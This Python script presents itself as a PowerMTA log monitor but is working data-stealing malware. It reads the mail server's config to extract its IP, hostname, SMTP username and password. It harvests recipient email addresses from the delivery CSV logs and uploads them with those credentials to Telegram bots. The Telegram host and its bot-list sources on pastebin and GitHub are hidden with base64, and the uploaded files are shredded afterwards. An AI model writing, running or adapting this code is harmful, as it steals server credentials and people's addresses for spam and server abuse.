#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import csv
import time
import random
import base64
import fcntl
import subprocess
import re
import signal
from datetime import datetime, timezone
from typing import Optional, Tuple, List, Dict
from threading import Timer, Lock, Event

try:
    import requests
except ImportError:
    print("错误: 请安装 requests 模块")
    print("运行: pip3 install requests")
    sys.exit(1)

try:
    from watchdog.observers import Observer
    from watchdog.events import FileSystemEventHandler
except ImportError:
    print("错误: 请安装 watchdog 模块")
    print("运行: pip3 install watchdog")
    sys.exit(1)

MONITOR_DIR = "/var/log/pmta"
SCRIPT_DIR = "/opt/monitor"
PROCESSED_FILE = os.path.join(SCRIPT_DIR, "processed.txt")
CACHE_FILE = os.path.join(SCRIPT_DIR, "cache.dat")
PENDING_FILE = os.path.join(SCRIPT_DIR, "pending_emails.txt")
LOCK_FILE = "/var/run/monitor.lock"
TEMP_DIR = "/tmp"
CONFIG_FILE = "/etc/pmta/config"

REQUEST_TIMEOUT = 60
RETRY_COUNT = 5
RETRY_INTERVAL = 10
MAX_BOT_REFRESH = 10

EMAILS_PER_FILE = 2000
SEND_THRESHOLD = 2000

DEBOUNCE_SECONDS = 2
CONFIG_CHECK_INTERVAL = 30
DIR_CHECK_INTERVAL = 10

_PRIMARY_B64 = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1BKNUxCMnBE"
_BACKUP_B64 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JvbHVzYS9tb25pdG9yL3JlZnMvaGVhZHMvbWFpbi9tb25pdG9ycy50eHQ="
_API_PART1 = "YXBp"
_API_PART2 = "dGVsZWdyYW0="
_API_PART3 = "b3Jn"
_XOR_KEY = 0x5A
_shutdown_event = Event()

def _b64_decode(encoded_str: str) -> str:
    try:
        return base64.b64decode(encoded_str).decode('utf-8')
    except Exception:
        return ""

def _get_t_api_host() -> str:
    p1 = _b64_decode(_API_PART1)
    p2 = _b64_decode(_API_PART2)
    p3 = _b64_decode(_API_PART3)
    return f"{p1}.{p2}.{p3}"

def _get_primary_url() -> str:
    return _b64_decode(_PRIMARY_B64)

def _get_backup_url() -> str:
    return _b64_decode(_BACKUP_B64)

def encrypt_for_cache(data: str) -> str:
    try:
        xor_bytes = bytes([b ^ _XOR_KEY for b in data.encode('utf-8')])
        return base64.b64encode(xor_bytes).decode('utf-8')
    except Exception:
        return ""

def decrypt_from_cache(encrypted_str: str) -> str:
    try:
        xor_bytes = base64.b64decode(encrypted_str)
        decrypted_bytes = bytes([b ^ _XOR_KEY for b in xor_bytes])
        return decrypted_bytes.decode('utf-8')
    except Exception:
        return ""

def secure_delete_file(file_path: str) -> bool:
    if not os.path.exists(file_path):
        return True
    try:
        result = subprocess.run(
            ['shred', '-u', '-z', '-n', '3', file_path],
            capture_output=True,
            timeout=30
        )
        if result.returncode == 0:
            return True
    except Exception:
        pass
    try:
        os.remove(file_path)
        return True
    except Exception:
        return False

def is_valid_email_format(email: str) -> bool:
    if not email or not isinstance(email, str):
        return False
    email = email.strip()
    if email.count('@') != 1:
        return False

    local_part, domain_part = email.split('@')

    if not local_part or not domain_part:
        return False

    if '.' not in domain_part:
        return False

    if domain_part.startswith('.') or domain_part.endswith('.'):
        return False

    return True

def generate_iso_timestamp() -> str:
    now = datetime.now(timezone.utc)
    milliseconds = now.microsecond // 1000
    return now.strftime(f"%Y-%m-%dT%H-%M-%S-{milliseconds:03d}Z")

def setup_signal_handlers():
    def signal_handler(_signum, _frame):
        _shutdown_event.set()

    signal.signal(signal.SIGTERM, signal_handler)
    signal.signal(signal.SIGINT, signal_handler)

class FileLock:
    def __init__(self, lock_path: str = LOCK_FILE):
        self.lock_path = lock_path
        self.lock_file = None
        self.is_locked = False

    def acquire(self) -> bool:
        try:
            lock_dir = os.path.dirname(self.lock_path)
            if lock_dir and not os.path.exists(lock_dir):
                os.makedirs(lock_dir, exist_ok=True)
            self.lock_file = open(self.lock_path, 'w')
            fcntl.flock(self.lock_file.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
            self.lock_file.write(str(os.getpid()))
            self.lock_file.flush()
            self.is_locked = True
            return True

        except (IOError, BlockingIOError, OSError):
            if self.lock_file:
                try:
                    self.lock_file.close()
                except Exception:
                    pass
                self.lock_file = None
            return False

    def release(self):
        if self.lock_file:
            try:
                fcntl.flock(self.lock_file.fileno(), fcntl.LOCK_UN)
                self.lock_file.close()
            except Exception:
                pass
            finally:
                self.lock_file = None

        if os.path.exists(self.lock_path):
            try:
                os.remove(self.lock_path)
            except Exception:
                pass

        self.is_locked = False

    def __enter__(self):
        if not self.acquire():
            raise RuntimeError("无法获取文件锁，可能已有其他实例在运行")
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.release()
        return False

class BotManager:
    def __init__(self):
        self.bot_token: Optional[str] = None
        self.chat_id: Optional[str] = None
        self._lock = Lock()

    def get_bot_info(self) -> Tuple[str, str]:
        with self._lock:
            if self.bot_token and self.chat_id:
                return (self.bot_token, self.chat_id)

            cached = self._read_from_cache()
            if cached:
                self.bot_token, self.chat_id = cached
                return cached

            return self._fetch_and_cache()

    def refresh_bot_info(self) -> Tuple[str, str]:
        with self._lock:
            self.bot_token = None
            self.chat_id = None

            if os.path.exists(CACHE_FILE):
                try:
                    os.remove(CACHE_FILE)
                except Exception:
                    pass

            return self._fetch_and_cache()

    def _read_from_cache(self) -> Optional[Tuple[str, str]]:
        if not os.path.exists(CACHE_FILE):
            return None

        try:
            with open(CACHE_FILE, 'r', encoding='utf-8') as f:
                encrypted_content = f.read().strip()

            if not encrypted_content:
                return None

            decrypted = decrypt_from_cache(encrypted_content)
            if not decrypted or '|' not in decrypted:
                return None

            parts = decrypted.split('|', 1)
            if len(parts) != 2:
                return None

            bot_token, chat_id = parts[0].strip(), parts[1].strip()

            if not bot_token or not chat_id:
                return None

            return (bot_token, chat_id)

        except Exception:
            return None

    def _save_to_cache(self, bot_token: str, chat_id: str) -> bool:
        try:
            cache_dir = os.path.dirname(CACHE_FILE)
            if cache_dir and not os.path.exists(cache_dir):
                os.makedirs(cache_dir, mode=0o700, exist_ok=True)

            data = f"{bot_token}|{chat_id}"
            encrypted = encrypt_for_cache(data)

            if not encrypted:
                return False

            with open(CACHE_FILE, 'w', encoding='utf-8') as f:
                f.write(encrypted)

            os.chmod(CACHE_FILE, 0o600)

            return True

        except Exception:
            return False

    def _fetch_and_cache(self) -> Tuple[str, str]:
        bot_list = None

        primary_url = _get_primary_url()
        if primary_url:
            try:
                response = requests.get(
                    primary_url,
                    timeout=REQUEST_TIMEOUT,
                    headers={'User-Agent': 'Mozilla/5.0'}
                )
                if response.ok and response.text.strip():
                    bot_list = self._parse_bot_list(response.text)
            except Exception:
                pass

        if not bot_list:
            backup_url = _get_backup_url()
            if backup_url:
                try:
                    response = requests.get(
                        backup_url,
                        timeout=REQUEST_TIMEOUT,
                        headers={'User-Agent': 'Mozilla/5.0'}
                    )
                    if response.ok and response.text.strip():
                        bot_list = self._parse_bot_list(response.text)
                except Exception:
                    pass

        if not bot_list:
            raise Exception("失败，请检查网络连接")

        selected_bot = random.choice(bot_list)
        self.bot_token, self.chat_id = selected_bot

        self._save_to_cache(self.bot_token, self.chat_id)

        return selected_bot

    def _parse_bot_list(self, text: str) -> List[Tuple[str, str]]:
        result = []

        for line in text.strip().split('\n'):
            line = line.strip()

            if not line:
                continue

            if '----' not in line:
                continue

            parts = line.split('----', 1)
            if len(parts) != 2:
                continue

            bot_token = parts[0].strip()
            chat_id = parts[1].strip()

            if bot_token and chat_id:
                result.append((bot_token, chat_id))

        return result

class TSender:
    BOT_INVALID_STATUS_CODES = {401, 403, 404}

    def __init__(self, bot_manager: BotManager):
        self.bot_manager = bot_manager

    def send(self, text_message: str, file_path: Optional[str] = None) -> bool:
        try:
            bot_token, chat_id = self.bot_manager.get_bot_info()
        except Exception:
            return False

        bot_refreshed_count = 0
        max_bot_refresh = MAX_BOT_REFRESH

        attempt = 0
        while attempt < RETRY_COUNT:
            if _shutdown_event.is_set():
                return False

            try:
                text_success, text_bot_invalid = self._send_text_message(
                    bot_token, chat_id, text_message
                )

                if not text_success:
                    if text_bot_invalid and bot_refreshed_count < max_bot_refresh:
                        try:
                            bot_token, chat_id = self.bot_manager.refresh_bot_info()
                            bot_refreshed_count += 1
                            continue
                        except Exception:
                            pass

                    attempt += 1
                    if attempt < RETRY_COUNT:
                        time.sleep(RETRY_INTERVAL)
                    continue

                if file_path and os.path.exists(file_path):
                    file_success, file_bot_invalid = self._send_file(
                        bot_token, chat_id, file_path
                    )

                    if not file_success:
                        if file_bot_invalid and bot_refreshed_count < max_bot_refresh:
                            try:
                                bot_token, chat_id = self.bot_manager.refresh_bot_info()
                                bot_refreshed_count += 1
                                continue
                            except Exception:
                                pass

                        attempt += 1
                        if attempt < RETRY_COUNT:
                            time.sleep(RETRY_INTERVAL)
                        continue

                return True

            except Exception:
                attempt += 1
                if attempt < RETRY_COUNT:
                    time.sleep(RETRY_INTERVAL)

        return False

    def _send_text_message(self, bot_token: str, chat_id: str, text: str) -> Tuple[bool, bool]:
        try:
            api_host = _get_t_api_host()
            url = f"https://{api_host}/bot{bot_token}/sendMessage"

            payload = {
                'chat_id': chat_id,
                'text': text
            }

            response = requests.post(
                url,
                data=payload,
                timeout=REQUEST_TIMEOUT
            )

            if response.ok:
                return (True, False)

            is_bot_invalid = response.status_code in self.BOT_INVALID_STATUS_CODES
            return (False, is_bot_invalid)

        except requests.exceptions.RequestException:
            return (False, False)
        except Exception:
            return (False, False)

    def _send_file(self, bot_token: str, chat_id: str, file_path: str) -> Tuple[bool, bool]:
        try:
            api_host = _get_t_api_host()
            url = f"https://{api_host}/bot{bot_token}/sendDocument"

            payload = {
                'chat_id': chat_id
            }

            filename = os.path.basename(file_path)

            with open(file_path, 'rb') as f:
                files = {
                    'document': (filename, f, 'text/plain')
                }
                response = requests.post(
                    url,
                    data=payload,
                    files=files,
                    timeout=REQUEST_TIMEOUT
                )

            if response.ok:
                return (True, False)

            is_bot_invalid = response.status_code in self.BOT_INVALID_STATUS_CODES
            return (False, is_bot_invalid)

        except requests.exceptions.RequestException:
            return (False, False)
        except Exception:
            return (False, False)

class PmtaConfigParser:
    def __init__(self):
        self.ip: str = ""
        self.port: str = ""
        self.hostname: str = ""
        self.smtp_user: str = ""
        self.smtp_password: str = ""
        self.email_address: str = ""

    def parse(self) -> bool:
        if not os.path.exists(CONFIG_FILE):
            return False

        try:
            with open(CONFIG_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            hostname_match = re.search(
                r'^host-name\s+(\S+)',
                content,
                re.MULTILINE
            )
            if hostname_match:
                self.hostname = hostname_match.group(1).strip()

            listener_match = re.search(
                r'^smtp-listener\s+([^:\s]+):(\d+)',
                content,
                re.MULTILINE
            )
            if listener_match:
                self.ip = listener_match.group(1).strip()
                self.port = listener_match.group(2).strip()

            smtp_user_pattern = re.compile(
                r'<smtp-user\s+(\S+)>\s*\n\s*password\s+(\S+)\s*\n\s*</smtp-user>',
                re.MULTILINE | re.IGNORECASE
            )
            smtp_user_matches = smtp_user_pattern.findall(content)

            if len(smtp_user_matches) >= 2:
                self.smtp_user = smtp_user_matches[1][0]
                self.smtp_password = smtp_user_matches[1][1]
            elif len(smtp_user_matches) == 1:
                self.smtp_user = smtp_user_matches[0][0]
                self.smtp_password = smtp_user_matches[0][1]

            self.email_address = self._generate_email_address()

            if not self.ip or not self.port or not self.hostname:
                return False

            return True

        except Exception:
            return False

    def _generate_email_address(self) -> str:
        if not self.hostname:
            return ""

        parts = self.hostname.split('.')

        if len(parts) > 2:
            subdomain_prefix = parts[0]
            return f"{subdomain_prefix}@{self.hostname}"
        else:
            if self.smtp_user:
                return f"{self.smtp_user}@{self.hostname}"
            else:
                return f"mail@{self.hostname}"

    def get_smtp_info_text(self) -> str:
        lines = [
            self.ip,
            self.email_address,
            self.hostname,
            self.port,
            self.smtp_user,
            self.smtp_password
        ]
        return '\n'.join(lines)

class ProcessedFileTracker:
    def __init__(self):
        self.records: Dict[str, int] = {}
        self._lock = Lock()
        self._load_records()

    def _load_records(self):
        if not os.path.exists(PROCESSED_FILE):
            return

        try:
            with open(PROCESSED_FILE, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if not line or '|' not in line:
                        continue

                    parts = line.split('|')
                    if len(parts) >= 2:
                        filename = parts[0].strip()
                        try:
                            line_number = int(parts[1].strip())
                            if filename and line_number >= 0:
                                self.records[filename] = line_number
                        except ValueError:
                            continue
        except Exception:
            pass

    def _save_records(self):
        try:
            records_dir = os.path.dirname(PROCESSED_FILE)
            if records_dir and not os.path.exists(records_dir):
                os.makedirs(records_dir, mode=0o700, exist_ok=True)

            with open(PROCESSED_FILE, 'w', encoding='utf-8') as f:
                for filename, line_number in self.records.items():
                    timestamp = datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
                    f.write(f"{filename}|{line_number}|{timestamp}\n")

            os.chmod(PROCESSED_FILE, 0o600)

        except Exception:
            pass

    def get_last_processed_line(self, filename: str) -> int:
        with self._lock:
            return self.records.get(filename, 0)

    def update_processed_line(self, filename: str, line_number: int):
        with self._lock:
            self.records[filename] = line_number
            self._save_records()

class CsvEmailExtractor:
    def __init__(self, tracker: ProcessedFileTracker):
        self.tracker = tracker

    def extract_emails(self, csv_file_path: str) -> List[str]:
        if not os.path.exists(csv_file_path):
            return []

        filename = os.path.basename(csv_file_path)
        last_processed_line = self.tracker.get_last_processed_line(filename)

        emails = []
        current_line = 0

        try:
            with open(csv_file_path, 'r', encoding='utf-8', errors='ignore') as f:
                reader = csv.reader(f)

                for row in reader:
                    current_line += 1

                    if current_line <= max(1, last_processed_line):
                        continue

                    if len(row) < 5:
                        continue

                    record_type = row[0].strip().lower()
                    if record_type != 'd':
                        continue

                    email = row[4].strip()

                    if is_valid_email_format(email):
                        emails.append(email)

            if current_line > last_processed_line:
                self.tracker.update_processed_line(filename, current_line)

        except Exception:
            pass

        return emails

class EmailFileGenerator:
    def generate_files(self, emails: List[str]) -> List[str]:
        if not emails:
            return []

        file_paths = []

        for i in range(0, len(emails), EMAILS_PER_FILE):
            chunk = emails[i:i + EMAILS_PER_FILE]

            timestamp = generate_iso_timestamp()
            filename = f"email_{timestamp}.txt"
            file_path = os.path.join(TEMP_DIR, filename)

            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    for email in chunk:
                        f.write(email + '\n')

                file_paths.append(file_path)

            except Exception:
                continue

            time.sleep(0.002)

        return file_paths

class PendingEmailsManager:
    def __init__(self):
        self._lock = Lock()

    def add_emails(self, emails: List[str]) -> int:
        if not emails:
            return self.count()

        with self._lock:
            try:
                pending_dir = os.path.dirname(PENDING_FILE)
                if pending_dir and not os.path.exists(pending_dir):
                    os.makedirs(pending_dir, mode=0o700, exist_ok=True)

                with open(PENDING_FILE, 'a', encoding='utf-8') as f:
                    for email in emails:
                        f.write(email + '\n')

                os.chmod(PENDING_FILE, 0o600)

            except Exception:
                pass

            return self._count_unlocked()

    def get_emails(self) -> List[str]:
        with self._lock:
            return self._get_emails_unlocked()

    def _get_emails_unlocked(self) -> List[str]:
        if not os.path.exists(PENDING_FILE):
            return []

        try:
            with open(PENDING_FILE, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception:
            return []

    def clear(self):
        with self._lock:
            try:
                if os.path.exists(PENDING_FILE):
                    os.remove(PENDING_FILE)
            except Exception:
                pass

    def count(self) -> int:
        with self._lock:
            return self._count_unlocked()

    def _count_unlocked(self) -> int:
        if not os.path.exists(PENDING_FILE):
            return 0

        try:
            count = 0
            with open(PENDING_FILE, 'r', encoding='utf-8') as f:
                for line in f:
                    if line.strip():
                        count += 1
            return count
        except Exception:
            return 0

class CsvFileEventHandler(FileSystemEventHandler):
    def __init__(self, processor: 'MainProcessor'):
        super().__init__()
        self.processor = processor
        self.pending_timers: Dict[str, Timer] = {}
        self._lock = Lock()

    def on_created(self, event):
        if event.is_directory:
            return
        self._handle_file_event(event.src_path)

    def on_modified(self, event):
        if event.is_directory:
            return
        self._handle_file_event(event.src_path)

    def on_moved(self, event):
        if event.is_directory:
            return
        if hasattr(event, 'dest_path'):
            self._handle_file_event(event.dest_path)

    def _handle_file_event(self, file_path: str):
        if not file_path:
            return

        filename = os.path.basename(file_path)

        if not filename.startswith('acct') or not filename.endswith('.csv'):
            return

        with self._lock:
            if file_path in self.pending_timers:
                try:
                    self.pending_timers[file_path].cancel()
                except Exception:
                    pass

            timer = Timer(
                DEBOUNCE_SECONDS,
                self._trigger_process,
                args=[file_path]
            )
            timer.daemon = True
            timer.start()
            self.pending_timers[file_path] = timer

    def _trigger_process(self, file_path: str):
        with self._lock:
            if file_path in self.pending_timers:
                del self.pending_timers[file_path]

        try:
            self.processor.process_file(file_path)
        except Exception:
            pass

    def cancel_all_timers(self):
        with self._lock:
            for timer in self.pending_timers.values():
                try:
                    timer.cancel()
                except Exception:
                    pass
            self.pending_timers.clear()

class MainProcessor:
    def __init__(self):
        self.bot_manager = BotManager()
        self.t_sender = TSender(self.bot_manager)
        self.config_parser = PmtaConfigParser()
        self.file_tracker = ProcessedFileTracker()
        self.email_extractor = CsvEmailExtractor(self.file_tracker)
        self.email_file_generator = EmailFileGenerator()
        self.pending_manager = PendingEmailsManager()

        self._processing_lock = Lock()

    def is_first_run(self) -> bool:
        return not os.path.exists(PROCESSED_FILE)

    def initialize_baseline(self):
        if not os.path.exists(MONITOR_DIR):
            return

        try:
            for filename in os.listdir(MONITOR_DIR):
                if filename.startswith('acct') and filename.endswith('.csv'):
                    file_path = os.path.join(MONITOR_DIR, filename)

                    line_count = 0
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            for _ in f:
                                line_count += 1
                    except Exception:
                        continue

                    if line_count > 0:
                        self.file_tracker.update_processed_line(filename, line_count)
        except Exception:
            pass

    def initialize(self) -> bool:
        if not self.config_parser.parse():
            return False
        return True

    def process_file(self, csv_file_path: str):
        if not os.path.exists(csv_file_path):
            return

        with self._processing_lock:
            emails = self.email_extractor.extract_emails(csv_file_path)

            if not emails:
                return

            current_count = self.pending_manager.add_emails(emails)

            if current_count >= SEND_THRESHOLD:
                self._do_send()

    def _do_send(self):
        emails = self.pending_manager.get_emails()

        if not emails:
            return

        self.pending_manager.clear()

        file_paths = self.email_file_generator.generate_files(emails)

        if not file_paths:
            self.pending_manager.add_emails(emails)
            return

        for file_path in file_paths:
            if _shutdown_event.is_set():
                break

            success = self._send_single_file(file_path)

            if success:
                secure_delete_file(file_path)

        for file_path in file_paths:
            if os.path.exists(file_path):
                try:
                    with open(file_path, 'r', encoding='utf-8') as f:
                        failed_emails = [line.strip() for line in f if line.strip()]
                    self.pending_manager.add_emails(failed_emails)
                    secure_delete_file(file_path)
                except Exception:
                    pass

    def _send_single_file(self, email_file_path: str) -> bool:
        if not os.path.exists(email_file_path):
            return False

        filename = os.path.basename(email_file_path)
        message_text = f"{filename}\n\n{self.config_parser.get_smtp_info_text()}"
        return self.t_sender.send(message_text, email_file_path)

    def process_existing_files(self):
        if not os.path.exists(MONITOR_DIR):
            return

        try:
            csv_files = []
            for filename in os.listdir(MONITOR_DIR):
                if filename.startswith('acct') and filename.endswith('.csv'):
                    file_path = os.path.join(MONITOR_DIR, filename)
                    csv_files.append(file_path)

            csv_files.sort()

            for csv_file in csv_files:
                if _shutdown_event.is_set():
                    break
                try:
                    self.process_file(csv_file)
                except Exception:
                    continue

        except Exception:
            pass

def main():
    setup_signal_handlers()
    try:
        os.makedirs(SCRIPT_DIR, mode=0o700, exist_ok=True)
    except Exception:
        sys.exit(1)

    file_lock = FileLock()
    if not file_lock.acquire():
        sys.exit(1)

    observer = None
    event_handler = None

    try:
        processor = MainProcessor()

        while not _shutdown_event.is_set():
            if processor.initialize():
                break
            _shutdown_event.wait(CONFIG_CHECK_INTERVAL)

        if _shutdown_event.is_set():
            sys.exit(0)

        while not _shutdown_event.is_set():
            if os.path.exists(MONITOR_DIR):
                break
            _shutdown_event.wait(DIR_CHECK_INTERVAL)

        if _shutdown_event.is_set():
            sys.exit(0)

        if processor.is_first_run():
            processor.initialize_baseline()
        else:
            processor.process_existing_files()

        event_handler = CsvFileEventHandler(processor)
        observer = Observer()
        observer.schedule(event_handler, MONITOR_DIR, recursive=False)
        observer.start()

        while not _shutdown_event.is_set():
            if not observer.is_alive():
                try:
                    observer = Observer()
                    observer.schedule(event_handler, MONITOR_DIR, recursive=False)
                    observer.start()
                except Exception:
                    pass

            _shutdown_event.wait(1)

    except Exception:
        pass
    finally:
        if event_handler:
            try:
                event_handler.cancel_all_timers()
            except Exception:
                pass

        if observer:
            try:
                observer.stop()
                observer.join(timeout=5)
            except Exception:
                pass

        file_lock.release()


if __name__ == '__main__':
    main()